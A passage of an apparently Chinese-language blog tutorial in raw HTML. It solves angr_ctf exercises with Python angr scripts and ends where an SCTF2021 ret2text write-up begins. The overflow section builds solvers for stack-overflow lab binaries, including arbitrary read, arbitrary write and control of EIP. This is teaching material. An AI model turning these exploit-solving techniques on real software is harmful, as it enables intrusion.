class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/12_angr_veritesting&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state, veritesting=<span class="literal">True</span>)</span><br><span class="line">simgr.explore(</span><br><span class="line">    find=<span class="keyword">lambda</span> state : <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>),</span><br><span class="line">    avoid=<span class="keyword">lambda</span> state: <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>这种写法与上面的写法是等价的：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.use_technique(angr.exploration_techniques.Veritesting())</span><br></pre></td></tr></table></figure><h4 id="library"><a href="#library" class="headerlink" title="library"></a>library</h4><p><strong>angr_static_binary</strong></p><p>angr没有成功识别静态库函数并替换，需要我们手动替换，防止angr符号执行陷进复杂的库函数里面</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/13_angr_static_binary&#x27;</span>)</span><br><span class="line"></span><br><span class="line">proj.hook_symbol(<span class="string">&#x27;printf&#x27;</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;printf&#x27;</span>]())</span><br><span class="line">proj.hook_symbol(<span class="string">&#x27;__isoc99_scanf&#x27;</span>,angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;scanf&#x27;</span>]())</span><br><span class="line">proj.hook_symbol(<span class="string">&#x27;strcmp&#x27;</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;strcmp&#x27;</span>]())</span><br><span class="line">proj.hook_symbol(<span class="string">&#x27;puts&#x27;</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;puts&#x27;</span>]())</span><br><span class="line">proj.hook_symbol(<span class="string">&#x27;__libc_start_main&#x27;</span>,angr.SIM_PROCEDURES[<span class="string">&#x27;glibc&#x27;</span>][<span class="string">&#x27;__libc_start_main&#x27;</span>]())</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(</span><br><span class="line">    find=<span class="keyword">lambda</span> state : <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>),</span><br><span class="line">    avoid=<span class="keyword">lambda</span> state: <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p><strong>angr_shared_library</strong></p><p>了解如何对动态链接库中单个的函数进行符号执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [esp+1Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( validate(s, <span class="number">8</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中validate函数是动态链接库lib14_angr_shared_library.so的函数：</p><p>我们可以直接通过call_state创建一个函数调用的初始状态：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">state = proj.factory.call_state(validate_addr, password, length)</span><br></pre></td></tr></table></figure><p>完整代码如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;/dist/lib14_angr_shared_library.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">validate_addr = <span class="number">0x4006D7</span></span><br><span class="line">password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">8</span> * <span class="number">8</span>)</span><br><span class="line">length = claripy.BVV(<span class="number">8</span>, <span class="number">32</span>)</span><br><span class="line">state = proj.factory.call_state(validate_addr, password, length)</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x400783</span>)</span><br><span class="line">found = simgr.found[<span class="number">0</span>]</span><br><span class="line">found.solver.add(found.regs.eax == <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(found.solver.<span class="built_in">eval</span>(password, cast_to=<span class="built_in">bytes</span>))</span><br></pre></td></tr></table></figure><p>动态链接库都是地址无关的可执行文件（position-independent executable，PIE），若不手动指定PIE的基质，angr会将符号执行的基址指定为默认的0x400000，并输出：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WARNING | <span class="number">2021</span>-<span class="number">10</span>-07 <span class="number">00</span>:<span class="number">15</span>:<span class="number">28</span>,<span class="number">674</span> | cle.loader | The main binary <span class="keyword">is</span> a position-independent executable. It <span class="keyword">is</span> being loaded <span class="keyword">with</span> a base address of <span class="number">0x400000</span>.</span><br></pre></td></tr></table></figure><p>当然也可以自行指定基址，方法如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/lib14_angr_shared_library.so&#x27;</span>, load_options=&#123;</span><br><span class="line">    <span class="string">&#x27;main_opts&#x27;</span> : &#123;</span><br><span class="line">        <span class="string">&#x27;base_addr&#x27;</span> : <span class="number">0x400000</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h4><p>angr_ctf系列的最后一节，在这一节我们通过三个栈溢出的例子来学习angr在漏洞挖掘方向的简单应用。</p><p><strong>angr_arbitrary_read</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  s = try_again;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u %20s&quot;</span>, &amp;key, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">41810812</span> )</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(try_again);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>scanf处有一个溢出，可以通过scanf将s的地址覆盖为0x484F6038，使<code>puts(s)</code>能够打印”Good Jobs”</p><p>直接梭哈的话不太行，angr没有分析出这个栈溢出漏洞，原因可能是angr无法分析出”Good Job”来自哪个地址：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/15_angr_arbitrary_read&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(</span><br><span class="line">    find=<span class="keyword">lambda</span> state : <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>),</span><br><span class="line">    avoid=<span class="keyword">lambda</span> state: <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))   </span><br></pre></td></tr></table></figure><p>该题是通过puts输出的，所以我们可以将判断输出中是否包含”Good Job.”的条件改为，puts的参数是否为”Good Job.”的地址，即0x484F6038。检测puts参数的代码如下，很好理解：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_puts</span>(<span class="params">state</span>):</span><br><span class="line">    puts_parameter = state.memory.load(state.regs.esp + <span class="number">4</span>, <span class="number">4</span>, endness=proj.arch.memory_endness)</span><br><span class="line">    <span class="keyword">if</span> state.solver.symbolic(puts_parameter):</span><br><span class="line">        good_job_string_address = <span class="number">0x484F6038</span></span><br><span class="line">        is_vulnerable_expression = puts_parameter == good_job_string_address</span><br><span class="line">        copied_state = state.copy()</span><br><span class="line">        copied_state.add_constraints(is_vulnerable_expression)</span><br><span class="line">        <span class="keyword">if</span> copied_state.satisfiable():</span><br><span class="line">            state.add_constraints(is_vulnerable_expression)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>explore的条件is_successful：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):</span><br><span class="line">    puts_address = <span class="number">0x08048370</span></span><br><span class="line">    <span class="keyword">if</span> state.addr == puts_address:</span><br><span class="line">        <span class="keyword">return</span> check_puts(state)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>程序的流程并不是很复杂，所以本题的关键还是在于给explore函数找到一个合适的判定条件。在自动化Pwn中，这个条件往往要改为执行到<code>system(&quot;/bin/sh&quot;)</code>。</p><p>完整代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_puts</span>(<span class="params">state</span>):</span><br><span class="line">    puts_parameter = state.memory.load(state.regs.esp + <span class="number">4</span>, <span class="number">4</span>, endness=proj.arch.memory_endness)</span><br><span class="line">    <span class="keyword">if</span> state.solver.symbolic(puts_parameter):</span><br><span class="line">        good_job_string_address = <span class="number">0x484F6038</span></span><br><span class="line">        is_vulnerable_expression = puts_parameter == good_job_string_address</span><br><span class="line">        copied_state = state.copy()</span><br><span class="line">        copied_state.add_constraints(is_vulnerable_expression)</span><br><span class="line">        <span class="keyword">if</span> copied_state.satisfiable():</span><br><span class="line">            state.add_constraints(is_vulnerable_expression)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):</span><br><span class="line">    puts_address = <span class="number">0x08048370</span></span><br><span class="line">    <span class="keyword">if</span> state.addr == puts_address:</span><br><span class="line">        <span class="keyword">return</span> check_puts(state)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/15_angr_arbitrary_read&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=is_successful)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>有一个要注意的地方是这里：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts_parameter = state.memory.load(state.regs.esp + <span class="number">4</span>, <span class="number">4</span>, endness=proj.arch.memory_endness)</span><br></pre></td></tr></table></figure><p>的<code>endness=proj.arch.memory_endness</code>是指定读取的方式为小端。</p><p><strong>angr_arbitrary_write</strong></p><p>这题的思路稍微比上题复杂一点，在这题中我们可以通过scanf将dest覆盖成任意地址，然后通过第二个strncpy向dest中保存的地址写入任何数据，因此我们可以向任何地址写入任何数据，这是一个任意写漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [esp+Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  dest = unimportant_buffer;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">strncpy</span>(password_buffer, <span class="string">&quot;PASSWORD&quot;</span>, <span class="number">0xC</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u %20s&quot;</span>, &amp;key, s);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">11604995</span> )</span><br><span class="line">    <span class="built_in">strncpy</span>(dest, s, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">strncpy</span>(unimportant_buffer, s, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(password_buffer, <span class="string">&quot;NDYNWEUJ&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们将dest覆盖成password_buffer的地址，然后再通过第二个strncpy往dest中写入”PASSWORD”，最后输出”Good Job.”</p><p>直接梭哈还是不行，原因可能是angr没有判断出password_buffer可以被覆盖为符号值。</p><p>还是按照上题的思路，这回我们要check的是strncpy函数，约束条件为dest指向的地址为password_buffer，并且src为”NDYNWEUJ”，代码如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_strncpy</span>(<span class="params">state</span>):</span><br><span class="line">    dest = state.memory.load(state.regs.esp + <span class="number">4</span>, <span class="number">4</span>, endness=proj.arch.memory_endness)</span><br><span class="line">    src = state.memory.load(state.regs.esp + <span class="number">8</span>, <span class="number">4</span>, endness=proj.arch.memory_endness)</span><br><span class="line">    src_content = state.memory.load(src, <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">if</span> state.solver.symbolic(src_content) <span class="keyword">and</span> state.solver.symbolic(dest):</span><br><span class="line">        is_vulnerable_expression = claripy.And(src_content == <span class="string">b&#x27;NDYNWEUJ&#x27;</span>, dest == <span class="number">0x57584344</span>)</span><br><span class="line">        copied_state = state.copy()</span><br><span class="line">        copied_state.add_constraints(is_vulnerable_expression)</span><br><span class="line">        <span class="keyword">if</span> copied_state.satisfiable():</span><br><span class="line">            state.add_constraints(is_vulnerable_expression)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):</span><br><span class="line">    strncpy_address = <span class="number">0x08048410</span></span><br><span class="line">    <span class="keyword">if</span> state.addr == strncpy_address:</span><br><span class="line">        <span class="keyword">return</span> check_strncpy(state)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/16_angr_arbitrary_write&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=is_successful)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p><strong>angr_arbitrary_jump</strong></p><p>rop</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">read_input</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">32</span>]; <span class="comment">// [esp+28h] [ebp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当一个指令有很多分支的可能性时，称之为不受约束（unconstrained）的状态， 比如说当用户的输入决定下一条指令的位置。angr 在遇到不受约束的状态时会将其抛出，本题将要关闭这个默认行为，转而利用此状态去求解能够跳转到print_good函数的payload。</p><p>求解步骤：</p><ul><li>初始化proj，让 angr 记录不受约束的状态</li><li>开始step直到发现 eip 为符号的状态</li><li>约束 eip 与 print_good 函数地址相同</li><li>约束求解</li></ul><p>完整exp：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/17_angr_arbitrary_jump&#x27;</span>)</span><br><span class="line">payload = claripy.BVS(<span class="string">&#x27;payload&#x27;</span>, <span class="number">64</span> * <span class="number">8</span>)</span><br><span class="line">state = proj.factory.entry_state(stdin=payload)</span><br><span class="line">simgr = proj.factory.simgr(</span><br><span class="line">    state, </span><br><span class="line">    save_unconstrained=<span class="literal">True</span>, </span><br><span class="line">    stashes=&#123;</span><br><span class="line">        <span class="string">&#x27;active&#x27;</span>:[state],</span><br><span class="line">        <span class="string">&#x27;unconstrained&#x27;</span>: [],</span><br><span class="line">        <span class="string">&#x27;found&#x27;</span>: [],</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">len</span>(simgr.active) <span class="keyword">or</span> <span class="built_in">len</span>(simgr.unconstrained)) <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">len</span>(simgr.found):</span><br><span class="line">    <span class="keyword">for</span> unconstrained <span class="keyword">in</span> simgr.unconstrained:</span><br><span class="line">        eip = unconstrained.regs.eip</span><br><span class="line">        print_good_addr = <span class="number">0x42585249</span></span><br><span class="line">        <span class="keyword">if</span> unconstrained.satisfiable(extra_constraints=[eip == print_good_addr]):</span><br><span class="line">            unconstrained.add_constraints(eip == print_good_addr)</span><br><span class="line">            simgr.move(<span class="string">&#x27;unconstrained&#x27;</span>, <span class="string">&#x27;found&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    simgr.drop(stash=<span class="string">&quot;unconstrained&quot;</span>)</span><br><span class="line">    simgr.step()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>打印unconstrained状态，可以发现其地址是由输入决定的：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>unconstrained</span><br><span class="line">&lt;SimState @ &lt;BV32 payload_0_512[<span class="number">199</span>:<span class="number">192</span>] .. payload_0_512[<span class="number">207</span>:<span class="number">200</span>] .. payload_0_512[<span class="number">215</span>:<span class="number">208</span>] .. payload_0_512[<span class="number">223</span>:<span class="number">216</span>]&gt;&gt;</span><br></pre></td></tr></table></figure><p>所以我们对eip进行约束求解，就能找到会导致栈溢出的payload。</p><h3 id="sctf2021-CheckIn-ret2text"><a href="#sctf2021-CheckIn-ret2text" class="headerlink" title="sctf2021-CheckIn_ret2text"></a>sctf2021-CheckIn_ret2text</h3><p>因为是复现,所以直接看源码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span 